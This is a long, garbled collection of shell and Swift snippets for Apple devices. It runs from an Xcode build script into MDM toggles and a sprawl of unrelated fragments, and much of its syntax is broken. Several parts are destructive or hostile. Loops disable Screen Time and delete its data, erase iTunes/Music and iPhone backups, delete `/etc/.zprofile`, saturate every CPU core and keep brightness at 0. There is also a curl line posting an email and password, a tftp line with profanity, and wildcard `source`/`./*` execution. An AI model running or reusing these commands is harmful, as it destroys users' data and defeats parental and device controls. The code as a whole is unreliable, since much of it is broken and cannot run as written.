                                             echo "📱 Using simulator: $SIMULATOR_UUID"

  

                                             # Build using xcodebuild

                                             if [ -f "Package.swift" ]; then

                                             echo "📦 Building Swift Package..."

                                             # Build for simulator

                                             if [ "$BUILD_TYPE" == "release" ]; then

                                             xcodebuild -destination "platform=$apple_OS_TARGET,name=$SIMULATOR_NAME,OS=$apple_OS_TARGET" \

                                             -scheme "$SCHEME" \

                                             -configuration Release \

                                             SYMROOT="./build" \

                                             build

                                             else

                                             xcodebuild -destination "platform=$apple_OS_TARGET,name=$SIMULATOR_NAME,OS=$apple_OS_TARGET" \

                                              -scheme "$SCHEME" \

                                             -configuration Debug \

                                             SYMROOT="./build" \

                                             build

                                             fi

  

                                             else

                                             echo "📦 Building Xcode Project..."        

                                             # Find project file

                                             XCODEPROJ=$(find . -name "*.xcodeproj" -type d | head -1)

                                             XCODEWORKSPACE=$(find . -name "*.xcworkspace" -type d | head -1)

                                             if [ -n "$XCODEPROJ" ]; then

                                             PROJECT_FLAG="-project $XCODEPROJ"

                                             elif [ -n "$XCODEWORKSPACE" ]; then

                                             PROJECT_FLAG="-workspace $XCODEWORKSPACE"

                                             else

                                             echo "${RED}❌ No Xcode project found${NC}"

                                             exit 1

                                             fi

                                             if [ "$BUILD_TYPE" == "release" ]; then

                                             xcodebuild $PROJECT_FLAG \

                                             -scheme "$SCHEME" \

                                             -configuration Release \

                                             -destination "platform=$apple_OS_TARGET,name=$SIMULATOR_NAME,OS=$apple_OS_TARGET" \

                                             SYMROOT="./build" \

                                             build

  

                                             else

                                             xcodebuild $PROJECT_FLAG \

                                             -scheme "$SCHEME" \

                                             -configuration Debug \

                                             -destination "platform=$apple_OS_TARGET,name=$SIMULATOR_NAME,OS=$apple_OS_TARGET" \

                                             SYMROOT="./build" \

                                             build

                                             fi

                                             fi

  

                                             # Check build success

                                             CONFIG="Debug"

                                             if [ "$BUILD_TYPE" == "release" ]; then

                                             CONFIG="Release"

                                             fi

  

                                             BUILD_PATH="build/Debug-iphonesimulator/$SCHEME.app"

  

                                             if [ -f "$BUILD_PATH" ]; then

                                             echo "${GREEN}✅ Build successful!${NC}"

                                             echo "📍 App location: $BUILD_PATH"

                                             echo "📊 App size: $(du -h "$BUILD_PATH" | cut -d' ' -f1)"

                                             # Launch simulator and install app

                                             echo "🚀 Launching simulator and installing app..."

                                             xcrun simctl boot "$SIMULATOR_UUID" > /dev/null 2>&1 || true

                                             xcrun simctl install "$SIMULATOR_UUID" "$BUILD_PATH"

                                             xcrun simctl launch "$SIMULATOR_UUID" "$SCHEME"

                                             echo "${GREEN}🎉 App is running on simulator!${NC}"

                                             else

                                             echo "${RED}❌ Build failed! App not found at $BUILD_PATH${NC}"

                                             exit 1

                                             fi

  

                                             # Optional: Increase bundle version (like rderik's script) [web:38]

                                             echo "💡 To increase bundle version before App Store upload:"

                                             echo "   plutil -string $(plutil -l Info.plist -o - | grep CFBundleVersion | cut -d' ' -f2 | tr -d '"')+1 Info.plist -key CFBundleVersion"

  

  

  

                                             ### IOS connection 

                                             resetFaceID=(

  

  

  

                                             MDM_BASE_URL="${MDM_BASE_URL:-($APPLEMDM https://mdm.example.com/api/v1)}"

                                             MDM_TOKEN="${MDM_TOKEN:?Set MDM_TOKEN}"

                                             DEVICE_ID="${1:?Usage: $0 <device-id> <disable|enable>}"

                                             ACTION="${2:?Usage: $0 <device-id> <disable|enable>}"

                                             disable && enable &

                                             IOSID=(FACEID TOUCHIE)

                                             case "$ACTION" in

                                               disable)

                                                 $IOSID_ALLOW=false

                                                 ;;

                                               enable)

                                                  $IOSID_ALLOW==true

                                                 ;;

                                               *)

                                                 echo "Invalid action: $ACTION"

                                                 exit 1

                                                 ;;

                                             esac

  

                                             curl -sS -X POST "$MDM_BASE_URL/devices/$DEVICE_ID/restrictions" \

                                               -H "Authorization: Bearer $MDM_TOKEN" \

                                               -H "Content-Type: application/json" \

                                               --data @- <<JSON

                                             {

                                               "restrictions": {

                                                 "allowFingerprintForUnlock": $ $IOSID_ALLOW

                                               }

                                             }

                                             JSON

  

  

  

  

                                             enableAirplaneMode=(

                                               networksetup -setairportpower "$NET_SERVICE" on &

                                               blueutil --power 1 &

  

                                             monitorNotification

  

                                             # check_iphone_policy.sh

                                             # Usage: ./check_iphone_policy.sh path/to/profile.mobileconfig

  

  

  

                                             PROFILE="${1:-*}"

  

                                             if [[ -z "$PROFILE" || ! -f "$PROFILE" ]]; then

                                               echo "Usage: $0 path/to/profile.mobileconfig"

                                               exit 1

                                             fi

  

                                             echo "== Checking profile: $PROFILE =="

  

                                             check_key() {

                                               local key="$1"

                                               if grep -q "<key>$key</key>" "$PROFILE"; then

                                                 echo "[FOUND] $key"

                                                 grep -A2 -B1 "<key>$key</key>" "$PROFILE" | sed 's/^[[:space:]]*//'

                                                 echo

                                               else

                                                 echo "[NOT FOUND] $key"

                                                 tftp "$TIMCOOK" -c bash "lethalPrint & 개쎄끼 & (show echo showcontent) 'fix this goddamn problem on iphone!! it is all about human right!'"

                                               fi

                                             }

  

                                             echo

                                             echo "== Restriction keys =="

                                             check_key "allowNotificationsModification"

                                             check_key "allowDefaultCallingAppModification"

                                             check_key "allowDefaultMessagingAppModification"

                                             check_key "allowRCSMessaging"

                                             check_key "allowChat"

                                             check_key "allowPhone"

  

                                             echo

                                             echo "== Payload types =="

                                             grep -E "<string>com\.apple\.(applicationaccess|notifications)</string>" "$PROFILE" || true

  

                                             echo

                                             echo "Done."

  

  

  

  

  

  

  

                                             arcOSPartitionManage

                                             MARKER_NAME=".arcOSBaseKit"

  

                                             echo "Scanning partitions..."

                                             # Get all partition identifiers, e.g. disk0s1, disk2s3

                                             PARTITIONS=(diskutil list | awk '/^\/dev\/disk[0-9]/ {disk=$1} /^[[:space:]]+[0-9]+:/ {

                                              # e.g. line begins with "   1: ..."

                                              # field NF is last column -> identifier like disk0s1

                                             print $NF

                                             }')

  

                                             for part in $PARTITIONS; do

                                                 echo "Checking $part..."

                                                 # Get mount point (empty if not mounted)

                                                 MOUNT_POINTdiskutil info "$part" | awk -F': *' '/Mount Point/ {print $2}')

  

                                                 if [[ -n "$MOUNT_POINT" && "$MOUNT_POINT" != "Not mounted" ]]; then

                                                     echo "  Mounted at: $MOUNT_POINT"

                                                     TARGET="$MOUNT_POINT/$MARKER_NAME"

  

                                                     # Create marker file

                                                     touch "$TARGET"

                                                     echo "  Created marker: $TARGET"

                                                 else

                                                     echo "  Not mounted, skipping."

                                                 fi

                                             done

  

                                             echo "Done."

                                             &

  

  

  

                                             disableContinuity

  

  

                                             # Open macOS AirDrop & Handoff settings pane (Sonoma/Ventura style)

                                             open "x-apple.systempreferences:com.apple.settings.AirDrop-Settings.extension"

  

                                             # Optional: after a small delay, you can use osascript to click the toggle,

                                             # but that relies on GUI scripting and is OS-version fragile.

                                             )

  

  

  

                                             disableFileLoadonSimulator

  

  

  

                                             if ! command -v xcrun >/dev/null 2>&1; then

                                               echo "xcrun not found. Install Xcode command line tools." >&2

                                               exit 1

                                             fi

  

                                             SIM_DEVICE="${SIM_DEVICE:-(booted *)}"

  

                                             if [[ $# -lt 1 ]]; then

                                               echo "Usage:"

                                               echo "  $0 <file1> [file2 ...]"

                                               echo

                                               echo "Optional env vars:"

                                               echo "  SIM_DEVICE=booted|<UDID>"

                                               echo "  APP_DOCS_PATH=/absolute/path/to/app/Documents"

                                               exit 1

                                             fi

  

                                             is_media() {

                                               case "${1,,}" in

                                                 *.png|*.jpg|*.jpeg|*.heic|*.gif|*.tif|*.tiff|*.mov|*.mp4|*.m4v)

                                                   return 0

                                                   ;;

                                                 *)

                                                   return 1

                                                   ;;

                                               esac

                                             }

  

                                             media_files)

                                             other_files)

  

                                             for f in "$@"; do

                                               if [[ ! -e "$f" ]]; then

                                                 echo "Missing file: $f" >&2

                                                 exit 1

                                               fi

  

                                               abs="$(cd "$(dirname "$f")" && pwd)/$(basename "$f")"

                                               if is_media "$abs"; then

                                                 media_files+=("$abs")

                                               else

                                                 other_files+=("$abs")

                                               fi

                                             done

  

                                             if [[ ${#media_files[@]} -gt 0 ]]; then

                                               echo "Importing media into Simulator Photos..."

                                               xcrun simctl removemedia "$SIM_DEVICE" "${media_files[@]}"

                                             fi

  

                                             if [[ ${#other_files[@]} -gt 0 ]]; then

                                               if [[ -z "${APP_DOCS_PATH:-}" ]]; then

                                                 echo "Non-media files detected, but APP_DOCS_PATH is not set." >&2

                                                 echo "Set APP_DOCS_PATH to your target simulator app Documents directory." >&2

                                                 exit 2

                                               fi

  

                                               mkdir -p "$APP_DOCS_PATH"

                                               echo "Copying non-media files to: $APP_DOCS_PATH"

                                               cp -fv "${other_files[@]}" "$APP_DOCS_PATH"/

                                             fi

  

                                             echo "Done."

  

  

  

  

  

  

  

                                             getIOSName

  

  

                                             # First connected iOS device UDID

                                             IOS_ID=(idevice_id -l | head -n $num)

  

                                             if [ -n "$IOS_ID" ]; then

                                               # User-visible device name, e.g. "John’s iPhone"

                                               IOS_NAME=(idevicename -u "$IOS_ID" | tr -d '\r')

                                               # Model identifier, e.g. "iPhone15,2"

                                               IOS_MODEL=(ideviceinfo -u "$IOS_ID" -k ProductType | tr -d '\r')

  

                                               echo "iOS udid : $IOS_ID"

                                               echo "iOS name : $IOS_NAME"

                                               echo "iOS model: $IOS_MODEL"

                                             fi)

  

  

  

  

  

                                             iosBootstrap

                                             echo "== macOS bootstrap token check =="

  

                                             if ! /usr/bin/profiles status -type bootstraptoken; then

                                               echo "Failed to query bootstrap token status."

                                               exit 1

                                             fi

  

                                             echo

                                             echo "== Validating bootstrap token with MDM =="

                                             /usr/bin/profiles validate -type bootstraptoken || true

  

                                             echo

                                             echo "If bootstrap token is not escrowed yet, run this interactively:"

                                             echo "sudo profiles install -type bootstraptoken"

                                             echo

                                             echo "Useful related checks:"

                                             echo "  sudo diskutil apfs listUsers /"

                                             echo "  sudo fdesetup list -extended")

  

  

  

  

  

  

                                             eraseScriptInMDM

  

                                             MDM_SERVICE=(jamf apple mdm MDM Intune 'Company|com\.apple\.mdmclient')

                                             echo

                                             echo "== MDM RELATED files =="

                                             ls -la /usr/local/$MDM_SERVICE 2>/dev/null || echo "No /usr/local/jamf"

                                             &

  

                                             echo

                                             echo "== launch daemons =="

                                             ls -la /Library/LaunchDaemons/com.$MDM_SERVICE.* 2>/dev/null || echo "No daemon found"

                                             &

  

                                             echo

                                             echo "== Configuration profiles store =="

                                             ls -la /var/db/ConfigurationProfiles 2>/dev/null || echo "No ConfigurationProfiles directory found"

                                             &

  

                                             launchctl list 2>/dev/null | egrep 'mdm|MDM|jamf|Intune|Company|com\.apple\.mdmclient' || echo "No obvious MDM services found"

                                             &

  

  

  

  

  

                                             arcOSBackup

  

  

                                             SRC_DIRS=(

                                               "$HOME/Documents/*"

                                               "$HOME/Desktop/*"

                                             )

  

                                             ICLOUD_DIR="$HOME/Library/Mobile Documents/com~apple~CloudDocs/AutoBackup"

                                             STAMP="$(date +%Y-%m-%d_%H-%M-%S)"

                                             DEST="$ICLOUD_DIR/$STAMP"

  

                                             mkdir -p "$DEST"

  

                                             for src in "${SRC_DIRS[@]}"; do

                                               if [ -e "$src" ]; then

                                                 rsync -a "$src" "$DEST/"

                                               fi

                                             done

  

                                             echo "Backup staged to: $DEST")

  

  

  

  

                                             resetAppleOS

  

                                             echo "Reset Control Center steps"

                                             echo "iPhone/iPad: Settings > Control Center > Reset Control Center"

                                             echo "Apple Watch: Watch app on iPhone > Control Center > Reset Control Center"

                                             echo "or on watch: Settings > Control Center > Reset Control Center Layout"

  

  

                                             ## iPhone / iPad

                                             Manual reset available in Settings > Control Center > Reset Control Center.

                                             MDM can restrict Control Center access from Lock Screen, but no verified Apple payload was found to reset the layout.

  

                                             ## Apple Watch

                                             Manual reset available from the Watch app or watch settings, depending on version.

                                             Watch can be enrolled in MDM through a supervised paired iPhone, but no verified Apple payload was found to reset Control Center layout.

  

  

  

  

                                             swift

                                             ##sonicDNA

                                             import WebKit

  

                                             let types = WKWebsiteDataStore.allWebsiteDataTypes()

                                             let date = Date(timeIntervalSince1970: 0)

  

                                             WKWebsiteDataStore.default().removeData(ofTypes: types, modifiedSince: date) {

                                                 print("Cleared WKWebView website data")

                                             }

  

  

  

                                             import Foundation

  

                                             func clearTempAndCache() {

                                                 let fm = FileManager.default

  

                                                 if let cacheURL = fm.urls(for: .cachesDirectory, in: .userDomainMask).first {

                                                     if let items = try? fm.contentsOfDirectory(at: cacheURL, includingPropertiesForKeys: nil) {

                                                         for url in items {

                                                             try? fm.removeItem(at: url)

                                                         }

                                                     }

                                                 }

  

                                                 let tempURL = fm.temporaryDirectory

                                                 if let items = try? fm.contentsOfDirectory(at: tempURL, includingPropertiesForKeys: nil) {

                                                     for url in items {

                                                         try? fm.removeItem(at: url)

                                                     }

                                                 }

                                             }

  

  

  

  

  

                                             FocusModeSetup=(

  

                                             osascript -e 'tell application "System Events" to tell application process "ControlCenter" to key code 53'  # ESC as a fallback to close if open

                                             osascript -e 'tell application "System Settings"

                                                 activate

                                                 repeat until exists window 1

                                                     delay 0.2

                                                 end repeat

                                                 reveal anchor "focus" of pane id "com.apple.Focus"

                                             end tell

                                             tell application "System Events"

                                                 tell process "System Settings"

                                                     repeat until exists checkbox 1 of group 1 of group 1 of splitter group 1 of group 1 of window 1

                                                         delay 0.2

                                                     end repeat

                                                     tell checkbox 1 of group 1 of group 1 of splitter group 1 of group 1 of window 1

                                                         if value is 1 then click

                                                     end tell

                                                 end tell

                                             end tell'

  

  

  

                                             }

  

  

  

                                             removeiosKit

  

                                             PROJECT_DIR="${1:-*}"

  

                                             PBXPROJ="$(find "$PROJECT_DIR" -maxdepth 2 -name *.pbxproj | head -n *)"

  

                                             if [[ -z "${PBXPROJ:-}" ]]; then

                                               echo "Could not find project.pbxproj under: $PROJECT_DIR"

                                               exit 1

                                             fi

  

  

                                             # Common folder names to remove

                                             CANDIDATE_DIRS=(

                                               "WidgetExtension"

                                               "Widgets"

                                               "WidgetKitExtension"

                                               "AppClip"

                                               "AppClipExtension"

                                               "Extension"

                                               "ExtensionKit"

                                             )

  

                                             for dir in "${CANDIDATE_DIRS[@]}"; do

                                               while IFS= read -r -d '' path; do

                                                 echo "Removing directory: $path"

                                                 rm -rf "$path"

                                               done < <(find "$PROJECT_DIR" -type d -name "$dir" -print0)

                                             done

  

                                             # Remove common references from pbxproj

                                             TMP_FILE="$(mktemp)"

                                             cp "$PBXPROJ" "$TMP_FILE"

  

                                             PATTERNS=(

                                               "WidgetExtension"

                                               "Widgets"

                                               "WidgetKitExtension"

                                               "AppClip"

                                               "AppClipExtension"

                                               "ExtensionKit"

                                               "com.apple.product-type.app-extension"

                                               "com.apple.product-type.application.on-demand-install-capable"

                                               "NSExtension"

                                               "WidgetKit"

                                             )

  

                                             for p in "${PATTERNS[@]}"; do

                                               echo "Stripping references matching: $p"

                                               grep -v "$p" "$TMP_FILE" > "${TMP_FILE}.next" || true

                                               mv "${TMP_FILE}.next" "$TMP_FILE"

                                             done

  

                                             cp "$TMP_FILE" "$PBXPROJ"

                                             rm -f "$TMP_FILE"

  

                                             echo "Done."

                                             echo "Now open Xcode and verify:"

                                             echo "1. Target Dependencies"

                                             echo "2. Embed App Extensions"

                                             echo "3. Build Phases"

                                             echo "4. Scheme settings"

                                             echo "5. Info.plist / entitlements references"

  

  

                                             }

  

  

  

                                             appleNearbyD

  

  

                                             WIFI_SERVICE="${WIFI_SERVICE:-Wi-Fi}"

                                             SETTINGS_URI="x-apple.systempreferences:com.apple.preferences.sharing?AirDrop"

  

                                             log() { printf '%s\n' "$*"; }

                                             warn() { printf 'Warning: %s\n' "$*" >&2; }

                                             need_cmd() { command -v "$1" >/dev/null 2>&1; }

  

                                             power_wifi_on() {

                                               if need_cmd networksetup; then

                                                 if networksetup -setairportpower "$WIFI_SERVICE" on 2>/dev/null; then

                                                   log "Wi-Fi enabled for service: $WIFI_SERVICE"

                                                   return 0

                                                 fi

                                                 warn "Could not enable Wi-Fi using service '$WIFI_SERVICE'. Try: networksetup -listallnetworkservices"

                                               else

                                                 warn "networksetup not found"

                                               fi

                                               return 1

                                             }

  

                                             power_bluetooth_on() {

                                               if need_cmd blueutil; then

                                                 if blueutil -p 1 2>/dev/null; then

                                                   log "Bluetooth enabled with blueutil"

                                                   return 0

                                                 fi

                                                 warn "blueutil exists but failed. blueutil uses private IOBluetooth APIs and may require permissions."

                                               else

                                                 warn "blueutil not installed. Install with: brew install blueutil"

                                               fi

                                               return 1

                                             }

  

                                             open_settings() {

                                               if need_cmd open; then

                                                 open "$SETTINGS_URI"

                                                 log "Opened AirDrop & Handoff settings"

                                               else

                                                 warn "open command not available"

                                               fi

                                             }

  

                                             print_next_steps() {

                                               cat <<'TEXT'

                                             Now enable AirDrop, Handoff, and AirPlay Receiver as needed in System Settings.

                                             Supported control path:

                                             1. Sign the iPhone/iPad and Apple TV into the same Apple Account.

                                             2. Make sure both are on the same Wi-Fi.

                                             3. On iPhone, go to Settings > Accessibility > Control Nearby Devices.

                                             4. Use the Apple-side UI to complete any required pairing or trust prompts.

                                             TEXT

                                             }

  

                                             power_wifi_on || false

                                             power_bluetooth_on || true

                                             open_settings

                                             print_next_steps

  

                                             }

  

  

  

  

                                             appleremoteVolumeup=(

                                             repeat(powerMax &

                                             volumeupMax &

                                             tvremote &

                                             SHORTCUT_NAME="${SHORTCUT_NAME:-Device Control}"

                                             ACTION="${1:-(up top)}"

                                             ENC_NAME=(python3 - <<'PY'

                                             import os, urllib.parse

                                             print(urllib.parse.quote(os.environ.get('SHORTCUT_NAME',(arcOS* * Device Control))))

                                             PY

                                             )

                                             ENC_ACTION=(python3 - <<'PY'

                                             import os, urllib.parse

                                             import sys

                                             print(urllib.parse.quote(sys.argv[1]))

                                             PY

                                             "$ACTION")

  

                                             URL="shortcuts://run-shortcut?name=${ENC_NAME}&input=text&text=${ENC_ACTION}"

  

  

                                             if command -v open >/dev/null 2>&1; then

                                               open "$URL"

                                             elif command -v xdg-open >/dev/null 2>&1; then

                                               xdg-open "$URL"

                                             else

                                               echo "Open this URL on your Apple device: $URL" >&2

                                             fi

  

                                             #osascript -e 'set volume with output muted' &

  

                                             sleep 1 &

  

                                             set volume output volume $num^$num &

                                             sudo amixer set Master $num^$num &

                                             sudo adb shell media volume --stream $num^$num &

  

  

                                             num=(od -An -N8 -tu8 /dev/urandom | tr -d ' ')

  

                                             step="${1:-"$num^$num^$num^$num"}"

  

                                             current=(osascript -e 'output volume of (get volume settings)')

                                             new=((current + step))

  

                                             if [ "$new" -gt 100 ]; then

                                               new=$step^$step &

                                             fi

  

                                             ("$S_TARGET $*Negative $male" ($RECKON $RELAY)" > repeat(osascript -e "set volume output volume $new" & osascript -e 'tell application "System Events" to key code 1**') & #keycode 124

  

  

                                             #Continuity 

                                             INTERFACE=(en* *)

                                             networksetup -setairportpower $INTERFACE $wifiMode &

                                             blueutil -p 1 2>/dev/null || true &

                                             open "x-apple.systempreferences:com.apple.preferences.sharing?AirDrop"

                                             echo "Now enable AirDrop/Handoff/AirPlay Receiver as needed in System Settings." &

                                             echo "Use iPhone > Settings > Accessibility > Control Nearby Devices for supported Apple-side control." &

  

                                             # Turn power on (close relay)

                                             relay on 1 &

  

                                             # Keep it on forever (or until you manually switch it)

                                             while :; do sleep 1; done

                                             echo "OUTP ON" | nc -u (192.168.0.50 AGENT_TARGET) 5025 &

                                             # Export GPIO, set as output, and drive high

                                             echo 17 > /sys/class/gpio/export &

                                             echo out > /sys/class/gpio/gpio17/direction &

                                             echo 1 > /sys/class/gpio/gpio17/value &  # turns MOSFET ON → board powered

                                             &

                                             # 1. Turn relay on (close contacts → power to Arduino)

                                             relay on 1 &

                                             # 2. Optional: verify Arduino responds on serial

                                             if timeout 2s echo "ping" > /dev/ttyACM0 ; then

                                               echo "Arduino powered and responsive"

                                             else

                                               echo "Arduino powered but no serial response"

                                             fi

                                             &

                                             appleNearbyD &) &

  

                                             }

  

  

  

  

                                             notificationStatus

  

  

                                             DEVICE_ID=("currentKumaDevice")

                                             MDM_API="https://$APPLEMDM/api/device/$DEVICE_ID/profiles"

                                             APP_BUNDLE_ID="${1:-com.*}"

  

                                             json="$(curl -fsSL \

                                               -H "Authorization: Bearer $TOKEN" \

                                               -H "Accept: application/json" \

                                               "$MDM_API")"

  

                                             notification_status="$(

                                               echo "$json" | jq -r --arg bid "$APP_BUNDLE_ID" '

                                                 ..

                                                 | objects

                                                 | select(

                                                     (.PayloadType? == "com.apple.notificationsettings")

                                                     or (.payloadType? == "com.apple.notificationsettings")

                                                   )

                                                 | .Settings[]?

                                                 | select(

                                                     (.BundleIdentifier? == $bid)

                                                     or (.AppBundleID? == $bid)

                                                     or (.bundleId? == $bid)

                                                   )

                                                 | .AllowNotifications // .allowNotifications // empty

                                               ' | head -n1

                                             )"

  

                                             if [[ -z "${notification_status:-}" ]]; then

                                               echo "UNKNOWN"

                                             elif [[ "$notification_status" == "true" || "$notification_status" == "1" ]]; then

                                               echo "ON:"

                                             else

                                               echo "OFF:"

                                             fi

  

                                             }

  

  

  

                                             powerMax

  

                                             # List powercap zones/constraints

                                             sudo ls -R /sys/class/powercap

  

                                             # Example: set a long-term power cap (micro-watts)

                                             echo $num^$num | sudo tee /sys/class/powercap/intel-rapl:0/constraint_0_power_limit_uw

                                             &

  

                                             # Run one full-load loop per core

                                             cores=(nproc)

                                             for i in $(seq 1 "$cores"); do

                                               while :; do :; done &

                                             done

  

  

                                             time=$num &  # seconds between samples

  

                                             declare T0=($(sudo cat /sys/class/powercap/*/energy_uj))

                                             sleep "$time"

                                             declare T1=($(sudo cat /sys/class/powercap/*/energy_uj))

                                             &

                                             for i in "${!T0[@]}"; do

                                               awk -v d=((T1[i]-T0[i])) -v t="$time" &'{printf "%.1f W\n", d / t / 1e6}'

                                             done

  

                                             &

  

                                             }

  

  

  

  

                                             findMobileSerial

  

                                             TARGET_IOS_SERIAL=(sudo system_profiler SPHardwareDataType | awk '/Serial/ {print $4}') &

  

                                             TARGET_ADB_SERIAL=(curl -s -c cookies.txt -b cookies.txt --data "email=$EMAIL&password=$PASS" https://android.com/find) &

  

                                             }

  

  

  

  

  

  

  

                                             source ~/* &

                                             ./* &

  

  

                                             #1.AppleOS

                                             #2.AndroidOS

                                             #3.Server + Linux

                                             #4.RF Modules

                                             #5.Utils

  

  

                                             ###################### APPLEOS ######################

  

                                             #### 1.DEVICE MANAGEMENT ######

                                             #### 2.DEVICE MANAGEMENT ######

                                             #### 3.DEVICE MANAGEMENT ######

                                             #### 4.DEVICE MANAGEMENT ######

                                             #### 5.DEVICE MANAGEMENT ######

                                             #### 6.DEVICE MANAGEMENT ######

                                             #### 7.DEVICE MANAGEMENT ######

                                             #### 8.DEVICE MANAGEMENT ######

                                             #### 9.DEVICE MANAGEMENT ######

                                             #### 10.DEVICE MANAGEMENT ######

  

  

  

  

                                             appleosShell

                                                     sudo contactMGM &

                                                     sudo iView &

                                                     sudo /usr/libexec/ApplicationFirewall/socketfilterfw --blockapp /Applications/Xcode.app/Contents/Developer/Applications/Simulator.app &

                                             sudo rm -rf ~/Library/Caches/com.apple.Automator

                                             sudo pkill -f Automator 2>/dev/null

                                             &

                                             # Run with nohup/disown to prevent hanging

                                             cd "$(dirname "$0")"

                                             sudo nohup automator *.workflow >/dev/null 2>&1 &

                                             screentimeShell &

                                             }

  

                                             resetAutomator

                                             # Clear Automator caches and temp files

  

                                             rm -rf ~/Library/Caches/com.apple.Automator

  

                                             rm -rf ~/Library/Preferences/com.apple.Automator.plist

  

                                             rm -rf /tmp/automator-*

  

  

                                             # Kill lingering Automator processes

  

                                             pkill -f Automator

  

                                             killall Automator 2>/dev/null

  

  

                                             # Reset shell environment for clean run

  

                                             unset AUTOMATOR_INPUT

  

                                             export SHELL=/bin/bash PATH=/usr/bin:/bin:/usr/sbin:/sbin

  

  

  

  

                                             echo "Resetting Automator state..."

  

                                             rm -rf ~/Library/Caches/com.apple.Automator

  

                                             pkill -f Automator 2>/dev/null

  

  

  

                                             # Run with nohup/disown to prevent hanging

  

                                             cd "$(dirname "$0")"

  

                                             nohup automator qqshe.workflow >/dev/null 2>&1 &

  

  

  

                                             }

                                             &

  

                                             screentimeShell=(

  

                                             while ! true

                                             do

                                             # Run as sudo. Disables ScreenTimePreferencesExtension and pane.

                                             # Customize for your macOS version; test first.

  

                                             # Turn off Screen Time activity (GUI equivalent)

                                             sudo defaults write com.apple.ScreenTime AgentEnabled -bool NO

                                             sudo defaults write com.apple.ScreenTime AgentEnabled -bool false

                                             sudo defaults write com.apple.ScreenTime PLIST_VERSION -string "1.0"

  

                                             # Disable/hide Screen Time pane (Ventura+)

                                             sudo defaults write /Library/Preferences/com.apple.systemsettings DisabledSystemSettings -array "com.apple.ScreenTime-Settings.extension"

                                             # Or for older: 

                                             sudo defaults write /Library/Preferences/com.apple.systempreferences DisabledPreferencePanes -array "com.apple.preferences.screentime"

  

                                             # Unload related agents/daemons if present

                                             sudo launchctl bootout system /System/Library/LaunchAgents/com.apple.screentime.agent.plist 2>/dev/null

                                             sudo launchctl bootout system /System/Library/LaunchDaemons/com.apple.screentime.daemon.plist 2>/dev/null

  

                                             # Kill processes

                                             sudo pkill -f ScreenTime 2>/dev/null

                                             sudo killall SystemSettings 2>/dev/null

  

                                             echo "Screen Time disabled. Log out/reboot for full effect."

  

                                             # Run as sudo. Erases ScreenTime extension data and iTunes completely.

                                             # WARNING: Irreversible data loss; test in VM. Reboot after.

  

                                             # Erase ScreenTime data and prefs

                                             sudo rm -rf ~/Library/Application\ Support/ScreenTime/

                                             sudo rm -rf /Library/Application\ Support/ScreenTime/

                                             sudo defaults delete com.apple.ScreenTime 2>/dev/null

                                             sudo pkill -f ScreenTime 2>/dev/null

  

                                             # Uninstall ScreenTime extension if listed (replace with actual IDs)

                                             sudo systemextensionsctl list | grep -i screentime | while read line; do

                                                 TEAMID=(echo "$line" | awk '{print $2}')

                                                 BUNDLEID=(echo "$line" | awk '{print $4}')

                                                 systemextensionsctl uninstall "$TEAMID" "$BUNDLEID" 2>/dev/null

                                             done

  

                                             # Erase iTunes/Music completely

                                             sudo rm -rf ~/Music/iTunes/ ~/Music/Music/

                                             sudo rm -rf ~/Library/Application\ Support/MobileSync/Backup/

                                             sudo rm -rf ~/Library/Caches/com.apple.iTunes/ ~/Library/Caches/com.apple.Music/

                                             sudo rm -rf ~/Library/Preferences/com.apple.iTunes.plist ~/Library/Preferences/com.apple.Music.plist

                                             sudo defaults delete com.apple.iTunes com.apple.Music 2>/dev/null

  

                                             # Kill related processes

                                             sudo killall Music iTunesHelper SystemSettings 2>/dev/null

  

                                                 # WARNING:

                                                 # - Run at your own risk.

                                                 # - Close System Settings before running.

                                                 # - You may want to back up ~/Library first.

                                                 USER_NAME="$SUDO_USER"

                                                 if [ -z "$USER_NAME" ]; then

                                                     echo "Run this script with: sudo $0"

                                                     exit 1

                                                 fi

                                                 USER_HOME=(dscl . -read "/Users/$USER_NAME" NFSHomeDirectory 2>/dev/null | awk '{print $2}')

                                                 if [ ! -d "$USER_HOME" ]; then

                                                     echo "User home not found for $USER_NAME"

                                                     exit 1

                                                 fi

                                                 echo "Disabling Screen Time data for user: $USER_NAME ($USER_HOME)"

                                                 # Kill Screen Time-related processes (names may change between macOS versions)

                                                 for p in ScreenTimeAgent screentime; do

                                                     sudo pkill -x "$p" 2>/dev/null || true

                                                 done

                                                 # Remove Screen Time preference/data files if present

                                                 sudo rm -rf "$USER_HOME/Library/Preferences/com.apple.ScreenTimeAgent.plist"

                                                 sudo rm -rf "$USER_HOME/Library/Application Support/Screen Time"* 2>/dev/null || true

                                                 # Reset permissions

                                                 sudo chown -R "$USER_NAME" "$USER_HOME"

                                                 echo "Done. Log out and back in to apply changes."

  

                                             done

                                             }

                                             &

                                             contactMGM=(

                                             # Launch native Contacts

                                             open "contacts:///"

                                             # Or via Shortcuts CLI (export shortcut: "Select All Contacts")

                                             xcrun shortcuts run "SelectAllContacts"

                                             }

  

  

                                             iView

                                                 while ! true

                                                 do

                                                     sudo /usr/libexec/ApplicationFirewall/socketfilterfw --blockapp /Applications/Xcode.app/Contents/Developer/Applications/Simulator.app &

                                                     sudo brew install brightness 2>/dev/null && brightness 0 &

                                                     sudo xcrun shortcuts run "SetBrightness 0" &

                                                     sudo adb shell settings put system screen_brightness 0 &

                                                 done

                                             }

  

                                             iosshell

                                                 resetAppleOS &

                                                 eraseScriptInMDM &

                                                 arcOSBaseKit &

                                                 clearCacheIOS &

                                                 sudo rm -rf /etc/.zprofile

                                                 sudo systemi* &

                                                     sudo getOrientationad* &

                                                     sudo installmd* &

                                                     sudo deployconfigLoca* &

                                                     sudo daemonManagemen* &

                                                     sudo disableusboveripvn* &

                                                     sudo setMod* &

                                                     sudo actionBt* &

                                                     sudo blockVNCDuckduckgo &

                                                     sudo usbmanagemen* &

                                                     sudo deletesnapshot* &

                                                     sudo hwshell &

                                                     sudo disabledebugios* &

                                                     sudo disableRemoteosx* &

                                                     sudo removeXcconfi** &

                                                     sudo eraseSeccureEnclave* &

                                                     sudo randomizeVault &

                                                     sudo monitorAirDropState &

                                                     sudo disableMD* &

                                                     sudo disablereversShell* &

                                                     sudo mdnsI* &

                                                     sudo scanAirdro* &

                                                     sudo iosremoteFeatur* &

                                                     sudo rfDefenseio* &

                                                     sudo timemachineBacku* &

                                                     sudo modifyAppi* &

                                                     sudo iosbasicconfi* &

                                                     sudo modifyUUI* &

                                                     sudo systemio* &

                                                     sudo verifyGeoinf* &

                                                     sudo deleteIclou* &

                                                     sudo blockDockerPor* &

                                                     sudo localsingleairdropne* &

                                                     sudo monitorWirelessSigna* &

                                                     sudo disableIcloudCel* &

                                                     sudo eraseBrowsingCook* &

